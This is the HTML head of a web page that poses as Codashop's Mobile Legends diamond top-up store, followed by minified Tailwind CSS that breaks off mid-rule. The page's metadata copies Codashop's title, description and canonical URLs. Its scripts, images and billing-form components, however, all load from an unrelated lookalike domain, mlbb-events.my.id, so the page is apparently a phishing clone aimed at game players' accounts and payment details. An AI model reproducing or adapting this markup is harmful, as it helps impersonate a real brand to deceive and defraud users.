      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Dlhiym56.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/B6UxX_UN.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CDJgXJc2.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/qb9wFFyZ.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Du2p0pZ-.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BGFquf0x.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Cnxw2aL0.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/JvZXXbWK.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BZpXKC2L.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/D71CCA93.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/B1IYgPPq.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/-MoUcL2M.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CTXp5iJP.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CoxbwL_k.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Ct29Zlcf.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Dc6qCJt_.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CnQDs5jN.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DCaPlc3O.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/C-2gWYrY.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BG0ffy3W.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BH13fzfO.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/PILC7Lg0.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BY1LadRc.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bs1YUYmM.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BhcrcKut.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Cra_b7u7.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DeyH62Tf.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CoqeU7vK.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bs08xIjL.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/wJ_MsGVC.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DBRSVlVD.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bb0xfAZ4.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CgCTF3iO.js">
      <link rel="prefetch" as="image" type="image/svg+xml" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/ornament.BU8Ny55Z.svg">
      <link rel="icon" type="image/x-icon" href="/favicon.ico">
      <link rel="apple-touch-icon" sizes="192x192" href="/apple-touch-icon.png">
      <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96.png">
      <link rel="icon" type="image/png" sizes="48x48" href="/favicon-48.png">
      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16.png">
      <meta name="application-name" content="Codashop">
      <meta property="og:site_name" content="Codashop - United States">
      <meta property="og:image:width" content="1200">
      <meta property="og:image:height" content="630">
      <meta property="og:type" content="website">
      <meta name="twitter:card" content="summary_large_image">
      <meta name="description" content="Diamonds, Twilight Pass & Weekly Diamond Pass instantly delivered to your MLBB account. Exciting promo and easy payments with Card Payments, PayPal, Cash App.">
      <meta property="og:description" content="Diamonds, Twilight Pass & Weekly Diamond Pass instantly delivered to your MLBB account. Exciting promo and easy payments with Card Payments, PayPal, Cash App.">
      <meta property="og:locale" content="en-US">
      <meta name="twitter:title" content="Buy Mobile Legends | Up to 2x Bonus Diamonds | Codashop - Codashop">
      <meta name="twitter:description" content="Diamonds, Twilight Pass & Weekly Diamond Pass instantly delivered to your MLBB account. Exciting promo and easy payments with Card Payments, PayPal, Cash App.">
      <meta property="og:title" content="Buy Mobile Legends | Up to 2x Bonus Diamonds | Codashop - Codashop">
      <meta property="og:url" content="https://www.codashop.com/en-us/mobile-legends">
      <meta property="og:image" content="https://coda-play.mlbb-events.my.id/assets/S/content/common/images/mno/mlbb_old.jpeg">
      <meta name="twitter:image" content="https://coda-play.mlbb-events.my.id/assets/S/content/common/images/mno/mlbb_old.jpeg">
      <link rel="alternate" hreflang="id-id" id="id-id" href="https://www.codashop.com/id-id/mobile-legends">
      <link rel="alternate" hreflang="en-ph" id="en-ph" href="https://www.codashop.com/en-ph/mobile-legends">
      <link rel="alternate" hreflang="fi-ph" id="fi-ph" href="https://www.codashop.com/fi-ph/mobile-legends">
      <link rel="alternate" hreflang="th-th" id="th-th" href="https://www.codashop.com/th-th/mobile-legends">
      <link rel="alternate" hreflang="en-my" id="en-my" href="https://www.codashop.com/en-my/mobile-legends">
      <link rel="alternate" hreflang="ms-my" id="ms-my" href="https://www.codashop.com/ms-my/mobile-legends">
      <link rel="alternate" hreflang="my-mm" id="my-mm" href="https://www.codashop.com/my-mm/mobile-legends">
      <link rel="alternate" hreflang="km-kh" id="km-kh" href="https://www.codashop.com/km-kh/mobile-legends">
      <link rel="alternate" hreflang="en-kh" id="en-kh" href="https://www.codashop.com/en-kh/mobile-legends">
      <link rel="alternate" hreflang="ar-eg" id="ar-eg" href="https://www.codashop.com/ar-eg/mobile-legends">
      <link rel="alternate" hreflang="en-eg" id="en-eg" href="https://www.codashop.com/en-eg/mobile-legends">
      <link rel="alternate" hreflang="lo-la" id="lo-la" href="https://www.codashop.com/lo-la/mobile-legends">
      <link rel="alternate" hreflang="en-la" id="en-la" href="https://www.codashop.com/en-la/mobile-legends">
      <link rel="alternate" hreflang="ar-sa" id="ar-sa" href="https://www.codashop.com/ar-sa/mobile-legends">
      <link rel="alternate" hreflang="en-sa" id="en-sa" href="https://www.codashop.com/en-sa/mobile-legends">
      <link rel="alternate" hreflang="en-ae" id="en-ae" href="https://www.codashop.com/en-ae/mobile-legends">
      <link rel="alternate" hreflang="ar-ae" id="ar-ae" href="https://www.codashop.com/ar-ae/mobile-legends">
      <link rel="alternate" hreflang="pt-br" id="pt-br" href="https://www.codashop.com/pt-br/mobile-legends">
      <link rel="alternate" hreflang="ru-ru" id="ru-ru" href="https://www.codashop.com/ru-ru/mobile-legends">
      <link rel="alternate" hreflang="tr-tr" id="tr-tr" href="https://www.codashop.com/tr-tr/mobile-legends">
      <link rel="alternate" hreflang="es-ar" id="es-ar" href="https://www.codashop.com/es-ar/mobile-legends">
      <link rel="alternate" hreflang="es-mx" id="es-mx" href="https://www.codashop.com/es-mx/mobile-legends">
      <link rel="alternate" hreflang="en-bd" id="en-bd" href="https://www.codashop.com/en-bd/mobile-legends">
      <link rel="alternate" hreflang="en-kw" id="en-kw" href="https://www.codashop.com/en-kw/mobile-legends">
      <link rel="alternate" hreflang="ar-kw" id="ar-kw" href="https://www.codashop.com/ar-kw/mobile-legends">
      <link rel="alternate" hreflang="en-lk" id="en-lk" href="https://www.codashop.com/en-lk/mobile-legends">
      <link rel="alternate" hreflang="mn-mn" id="mn-mn" href="https://www.codashop.com/mn-mn/mobile-legends">
      <link rel="alternate" hreflang="zh-tw" id="zh-tw" href="https://www.codashop.com/zh-tw/mobile-legends">
      <link rel="alternate" hreflang="en-tw" id="en-tw" href="https://www.codashop.com/en-tw/mobile-legends">
      <link rel="alternate" hreflang="en-sg" id="en-sg" href="https://www.codashop.com/en-sg/mobile-legends">
      <link rel="alternate" hreflang="en-ca" id="en-ca" href="https://www.codashop.com/en-ca/mobile-legends">
      <link rel="alternate" hreflang="fr-ca" id="fr-ca" href="https://www.codashop.com/fr-ca/mobile-legends">
      <link rel="alternate" hreflang="es-co" id="es-co" href="https://www.codashop.com/es-co/mobile-legends">
      <link rel="alternate" hreflang="es-cl" id="es-cl" href="https://www.codashop.com/es-cl/mobile-legends">
      <link rel="alternate" hreflang="en-gb" id="en-gb" href="https://www.codashop.com/en-gb/mobile-legends">
      <link rel="alternate" hreflang="en-us" id="en-us" href="https://www.codashop.com/en-us/mobile-legends">
      <link rel="alternate" hreflang="es-us" id="es-us" href="https://www.codashop.com/es-us/mobile-legends">
      <link rel="alternate" hreflang="fr-fr" id="fr-fr" href="https://www.codashop.com/fr-fr/mobile-legends">
      <link rel="alternate" hreflang="en-fr" id="en-fr" href="https://www.codashop.com/en-fr/mobile-legends">
      <link rel="alternate" hreflang="de-de" id="de-de" href="https://www.codashop.com/de-de/mobile-legends">
      <link rel="alternate" hreflang="en-de" id="en-de" href="https://www.codashop.com/en-de/mobile-legends">
      <link rel="alternate" hreflang="es-pe" id="es-pe" href="https://www.codashop.com/es-pe/mobile-legends">
      <link rel="alternate" hreflang="en-pk" id="en-pk" href="https://www.codashop.com/en-pk/mobile-legends">
      <link rel="alternate" hreflang="es-bo" id="es-bo" href="https://www.codashop.com/es-bo/mobile-legends">
      <link rel="alternate" hreflang="en-qa" id="en-qa" href="https://www.codashop.com/en-qa/mobile-legends">
      <link rel="alternate" hreflang="ar-qa" id="ar-qa" href="https://www.codashop.com/ar-qa/mobile-legends">
      <link rel="alternate" hreflang="nl-nl" id="nl-nl" href="https://www.codashop.com/nl-nl/mobile-legends">
      <link rel="alternate" hreflang="en-nl" id="en-nl" href="https://www.codashop.com/en-nl/mobile-legends">
      <link rel="alternate" hreflang="en-np" id="en-np" href="https://www.codashop.com/en-np/mobile-legends">
      <link rel="alternate" hreflang="ru-kz" id="ru-kz" href="https://www.codashop.com/ru-kz/mobile-legends">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BVIZOJ1M.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/gHVjhhV0.js">
      <link rel="stylesheet" href="css/default.BzdkMEGG.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/GupAqwI6.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/B3PhbIyv.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/iHo0cki3.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DI0wCEcQ.js">
      <link rel="stylesheet" href="css/Header.DBqX41vY.css">
      <link rel="stylesheet" href="css/Footer.DGbf0AXy.css">
      <link rel="stylesheet" href="css/Hero.DPbncZ5q.css">
      <link rel="stylesheet" href="css/Tooltip.BjcTSI_m.css">
      <link rel="stylesheet" href="css/Instructions.DC5UWLDa.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bh1rjF1h.js">
      <link rel="stylesheet" href="css/BillingForm.BtwpVYVl.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/B-5y2Yjb.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DR3Yd1EV.js">
      <link rel="stylesheet" href="css/Category.7Q4fGZwk.css">
      <link rel="stylesheet" href="css/Contact.3HIQMxEM.css">
      <link rel="stylesheet" href="css/Country.C9dXdJHH.css">
      <link rel="stylesheet" href="css/Social.Bis463MZ.css">
      <link rel="stylesheet" href="css/Legal.KlbezL_M.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/C2XbKVP0.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/qr4FOOTF.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/D5Mx-rvH.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BwTPJ-2X.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CW3CzcP-.js">
      <link rel="stylesheet" href="css/Banner.DLTGqivo.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BKfxhp1E.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BvNLlpkj.js">
      <link rel="stylesheet" href="css/Sidebar.61bhHIgO.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DU4gK7oz.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Bc2GfkhP.js">
      <link rel="stylesheet" href="css/InfoBars.DAVj1K-y.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/9-6gYm6K.js">
      <link rel="stylesheet" href="css/TooltipDisplay.BP1mB7Cq.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Dy3s_hbM.js">
      <link rel="stylesheet" href="css/InfoSheet.XvZuAAbC.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/KwdN63el.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DElYnZz_.js">
      <link rel="stylesheet" href="css/PurchasePendingModal.D2Z83_ny.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/h2M2xi_k.js">
      <link rel="stylesheet" href="css/LiveOpsUserIDModal.B4u_DQe1.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/CkTq2Rb0.js">
      <link rel="stylesheet" href="css/FreebieRedeemModal.BGvTUp8h.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/Cx36d3s3.js">
      <link rel="stylesheet" href="css/LoyaltyRedeemModal.ITDcVu93.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DtvKGjre.js">
      <link rel="stylesheet" href="css/ManageCookie.BlPHKQhD.css">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/BKTrOWL4.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DfYywAGo.js">
      <link rel="modulepreload" as="script" href="https://coda-play.mlbb-events.my.id/assets/_nuxt/DGIiOzdu.js">
   <style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.pointer-events-none{pointer-events:none}.pointer-events-auto{pointer-events:auto}.visible{visibility:visible}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0px}.inset-x-0{left:0px;right:0px}.top-\[7\%\]{top:7%}.left-3{left:0.75rem}.top-3{top:0.75rem}.left-0{left:0px}.top-0{top:0px}.z-10{z-index:10}.z-\[9999\]{z-index:9999}.z-30{z-index:30}.z-50{z-index:50}.mx-\[4px\]{margin-left:4px;margin-right:4px}.my-1{margin-top:0.25rem;margin-bottom:0.25rem}.mx-auto{margin-left:auto;margin-right:auto}.me-\[12px\]{margin-inline-end:12px}.mb-2{margin-bottom:0.5rem}.mb-1{margin-bottom:0.25rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mr-3{margin-right:0.75rem}.mt-1{margin-top:0.25rem}.mt-2{margin-top:0.5rem}.mt-4{margin-top:1rem}.mt-\[8px\]{margin-top:8px}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.hidden{display:none}.size-\[24px\]{width:24px;height:24px}.h-0\.5{height:0.125rem}.h-5{height:1.25rem}.h-7{height:1.75rem}.h-\[24px\]{height:24px}.h-6{height:1.5rem}.h-10{height:2.5rem}.h-12{height:3rem}.h-16{height:4rem}.h-3{height:0.75rem}.h-4{height:1rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-5{width:1.25rem}.w-7{width:1.75rem}.w-\[42px\]{width:42px}.w-full{width:100%}.w-6{width:1.5rem}.w-10{width:2.5rem}.w-12{width:3rem}.w-16{width:4rem}.w-3{width:0.75rem}.w-4{width:1rem}.max-w-\[420px\]{max-width:420px}.max-w-md{max-width:28rem}.max-w-sm{max-width:24rem}.flex-1{flex:1 1 0%}.flex-shrink-0{flex-shrink:0}.shrink-0{flex-shrink:0}.translate-y-full{--tw-translate-y:100%;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.scale-95{--tw-scale-x:.95;--tw-scale-y:.95;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.transform{transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}.cursor-pointer{cursor:pointer}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-end{align-items:flex-end}.items-center{align-items:center}.items-baseline{align-items:baseline}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-2{gap:0.5rem}.gap-3{gap:0.75rem}.gap-1{gap:0.25rem}.gap-4{gap:1rem}.space-y-2 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.5rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.5rem * var(--tw-space-y-reverse))}.space-y-3 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.75rem * var(--tw-space-y-reverse))}.space-y-4 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.rounded{border-radius:0.25rem}.rounded-2xl{border-radius:1rem}.rounded-xl{border-radius:0.75rem}.rounded-md{border-radius:0.375rem}.rounded-\[8px\]{border-radius:8px}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-t-2xl{border-top-left-radius:1rem;border-top-right-radius:1rem}.rounded-br-lg{border-bottom-right-radius:0.5rem}.border{border-width:1px}.border-t{border-top-width:1px}.border-b{border-bottom-width:1px}.border-gray-100{--tw-border-opacity:1;border-color:rgb(243 244 246 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-gray-50{--tw-border-opacity:1;border-color:rgb(249 250 251 / var(--tw-border-opacity, 1))}.border-\[\#5278ad\]{--tw-border-opacity:1;border-color:rgb(82 120 173 / var(--tw-border-opacity, 1))}.border-gray-600\/50{border-color:rgb(75 85 99 / 0.5)}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-indigo-50{--tw-border-opacity:1;border-color:rgb(238 242 255 / var(--tw-border-opacity, 1))}.border-red-200{--tw-border-opacity:1;border-color:rgb(254 202 202 / var(--tw-border-opacity, 1))}.bg-\[\#99f1c5\]{--tw-bg-opacity:1;background-color:rgb(153 241 197 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-\[\#3b5d8a\]{--tw-bg-opacity:1;background-color:rgb(59 93 138 / var(--tw-bg-opacity, 1))}.bg-black\/80{background-color:rgb(0 0 0 / 0.8)}.bg-\[\#5b4ef6\]{--tw-bg-opacity:1;background-color:rgb(91 78 246 / var(--tw-bg-opacity, 1))}.bg-\[\#D1FADF\]{--tw-bg-opacity:1;background-color:rgb(209 250 223 / var(--tw-bg-opacity, 1))}.bg-\[\#EFEBFD\]{--tw-bg-opacity:1;background-color:rgb(239 235 253 / var(--tw-bg-opacity, 1))}.bg-\[\#F5F6FF\]{--tw-bg-opacity:1;background-color:rgb(245 246 255 / var(--tw-bg-opacity, 1))}.bg-\[\#FEF2F2\]{--tw-bg-opacity:1;background-color:rgb(254 242 242 / var(--tw-bg-opacity, 1))}.bg-black\/60{background-color:rgb(0 0 0 / 0.6)}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-red-50{--tw-bg-opacity:1;background-color:rgb(254 242 242 / var(--tw-bg-opacity, 1))}.bg-transparent{background-color:transparent}.bg-gradient-to-r{background-image:linear-gradient(to right, var(--tw-gradient-stops))}.from-\[\#f7e44e\]{--tw-gradient-from:#f7e44e var(--tw-gradient-from-position);--tw-gradient-to:rgb(247 228 78 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.from-\[\#ff7f98\]{--tw-gradient-from:#ff7f98 var(--tw-gradient-from-position);--tw-gradient-to:rgb(255 127 152 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.to-\[\#ffaf45\]{--tw-gradient-to:#ffaf45 var(--tw-gradient-to-position)}.to-\[\#6242fb\]{--tw-gradient-to:#6242fb var(--tw-gradient-to-position)}.fill-\[\#007547\]{fill:#007547}.fill-\[\#DC2626\]{fill:#DC2626}.object-contain{object-fit:contain}.object-cover{object-fit:cover}.p-\[10px\]{padding:10px}.p-4{padding:1rem}.p-6{padding:1.5rem}.p-0{padding:0px}.p-1{padding:0.25rem}.p-1\.5{padding:0.375rem}.p-5{padding:1.25rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.px-4{padding-left:1rem;padding-right:1rem}.px-\[8px\]{padding-left:8px;padding-right:8px}.py-0\.5{padding-top:0.125rem;padding-bottom:0.125rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.px-8{padding-left:2rem;padding-right:2rem}.px-\[12px\]{padding-left:12px;padding-right:12px}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3\.5{padding-top:0.875rem;padding-bottom:0.875rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-\[6px\]{padding-top:6px;padding-bottom:6px}.pb-4{padding-bottom:1rem}.pb-2{padding-bottom:0.5rem}.pb-6{padding-bottom:1.5rem}.pt-2{padding-top:0.5rem}.pt-4{padding-top:1rem}.pt-5{padding-top:1.25rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.font-sans{font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", 